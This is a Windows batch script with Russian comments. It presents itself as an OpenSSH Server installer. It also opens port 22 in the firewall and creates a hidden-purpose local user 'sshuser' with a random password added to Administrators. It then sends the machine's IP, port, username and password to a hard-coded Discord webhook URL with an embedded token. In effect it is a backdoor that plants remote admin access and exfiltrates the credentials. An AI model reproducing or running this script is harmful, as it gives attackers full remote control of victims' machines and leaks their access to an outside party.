@echo off
setlocal enabledelayedexpansion

REM URL вебхука Discord
set WebhookURL=https://discord.com/api/webhooks/1311849224886812702/dsmLjee1J1LmsF5oxFnj14QwPEcbKoZgsCnYcgEv-wdexA7rHko3ZR9Nquyd4cyRvaCs

REM Функция отправки сообщения в Discord
:send_discord_message
set MessageContent=%1
powershell -Command "Invoke-RestMethod -Uri %WebhookURL% -Method Post -Body '{\"content\":\"%MessageContent%\"}' -ContentType 'application/json'"
goto :eof

REM Стартовое сообщение
call :send_discord_message "🚀 Начало установки OpenSSH Server..."

REM Проверка на Linux или Windows и установка OpenSSH Server
systeminfo | findstr /i "OS" | findstr /i "Microsoft" > nul
if %errorlevel% equ 0 (
    REM Это Windows
    call :send_discord_message "🖥️ Обнаружена Windows-система. Устанавливаем OpenSSH Server..."
    dism /online /add-capability /capabilityname:OpenSSH.Server~~~~0.0.1.0
    powershell Start-Service sshd
    powershell Set-Service -Name sshd -StartupType 'Automatic'
    call :send_discord_message "✅ OpenSSH Server установлен и запущен на Windows."

    REM Настройка firewall
    netsh advfirewall firewall show rule name=OpenSSH-Server-In-TCP > nul
    if %errorlevel% neq 0 (
        netsh advfirewall firewall add rule name="OpenSSH-Server-In-TCP" dir=in action=allow protocol=TCP localport=22
        call :send_discord_message "🔒 Настроено правило firewall для SSH."
    ) else (
        call :send_discord_message "🛡️ Правило firewall для SSH уже существует."
    )

    REM Генерация случайного пароля
    setlocal enabledelayedexpansion
    set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    set "Password="
    for /L %%i in (1,1,12) do (
        set /a "index=!random! %% 62"
        for /f %%c in ('echo !chars:~!index!,1!') do set Password=!Password!%%c
    )
    call :send_discord_message "🔑 Сгенерирован пароль: %Password%"

    REM Добавление пользователя
    set Username=sshuser
    net user %Username% %Password% /add
    net localgroup administrators %Username% /add
    call :send_discord_message "👤 Создан пользователь: %Username%."

    REM Получаем IP-адрес устройства
    for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do (
        set IPAddress=%%a
    )
    call :send_discord_message "🌐 IP-адрес устройства: %IPAddress%"

    REM Порт SSH
    set Port=22
    call :send_discord_message "⚙️ Порт SSH: %Port%"

    REM Итоговое сообщение
    call :send_discord_message "✅ OpenSSH Server успешно установлен за %time% секунд!`nIP: %IPAddress%`nPort: %Port%`nUser: %Username%`nPassword: %Password%"
) else (
    REM Это Linux
    call :send_discord_message "💻 Обнаружена Linux-система. Устанавливаем OpenSSH Server..."
    sudo apt install openssh-server -y
    call :send_discord_message "✅ OpenSSH Server установлен на Linux."
)

REM Завершающее сообщение
call :send_discord_message "🛑 Установка завершена. Нажмите любую клавишу для выхода."
pause
